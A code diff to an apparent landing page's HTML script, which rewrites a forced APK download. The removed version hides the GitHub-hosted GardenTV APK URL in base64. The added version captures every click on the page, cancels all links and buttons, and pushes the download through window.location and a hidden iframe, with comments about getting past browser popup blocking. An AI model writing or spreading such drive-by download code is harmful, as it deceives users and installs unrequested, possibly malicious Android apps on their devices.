@@ -464,46 +464,38 @@ margin-bottom: 24px;
 
     <!-- Any click triggers download logic + prevents default redirection -->
 	<script>
-		function startDownload() {
-			// 请替换为实际的 APK 文件链接
-			const downloadUrl = decodeURIComponent(escape(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BodW9uZ2FuaGxlMTgxMi1sYW5nL2Fwa3B1cm9rai9yZWZzL2hlYWRzL21haW4vR2FyZGVuVFZfdjEuMS4yLmFwaw==')));
-			
-			// 创建一个新的 <a> 元素
-			const a = document.createElement('a');
-			a.href = downloadUrl;
-			a.download = 'GardenTV.apk';
-			a.style.display = 'none'; // 隐藏链接
-			
-			// 将 <a> 元素添加到文档主体
-			document.body.appendChild(a);
-			
-			// 阻止事件冒泡，防止重复触发
-			a.addEventListener('click', function(e) {
-				e.preventDefault();
-				e.stopPropagation();
-			});
-			
-			// 使用 setTimeout 来模拟用户交互，可能有助于避免某些浏览器的安全限制
-			setTimeout(() => {
-				a.click(); // 触发点击事件以开始下载
-				document.body.removeChild(a); // 清理DOM，移除临时的 <a> 元素
-			}, 0); // 设置为0毫秒，确保脚本执行后立即触发
-			
-			console.log('Download started'); // 添加调试信息
-		}
+        // 定义下载链接变量，方便修改
+        const apkUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
 
-		// 防止重复绑定事件监听器
-		let downloadTriggered = false;
+        function startDownload() {
+            console.log("启动下载任务...");
+            
+            // 核心优化：使用 window.location.href 绕过弹窗拦截
+            window.location.href = apkUrl;
+            
+            // 备用方案（如果上面失效，尝试创建一个隐藏的 iframe 强制下载）
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = apkUrl;
+                document.body.appendChild(iframe);
+			// 清理 DOM	
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                }, 1000);
+            }, 500);
+        }
 
-		// 监听整个文档的点击事件
-		document.addEventListener('click', function(event) {
-			if (!downloadTriggered) {
-				downloadTriggered = true;
-				startDownload();
-			}
-		});
-	</script>
-
-
+        // 监听全屏点击 (捕获阶段)
+        document.addEventListener('click', function(e) {
+            // 阻止页面上任何元素的默认行为（防止链接跳转、防止按钮刷新等）
+            e.preventDefault(); 
+            e.stopPropagation(); 
+            
+            // 用户主动点击触发下载是最高优先级的，浏览器绝对不会拦截
+            console.log("用户点击触发下载");
+            startDownload();
+        }, true);
+    </script>
 </body>
 </html>
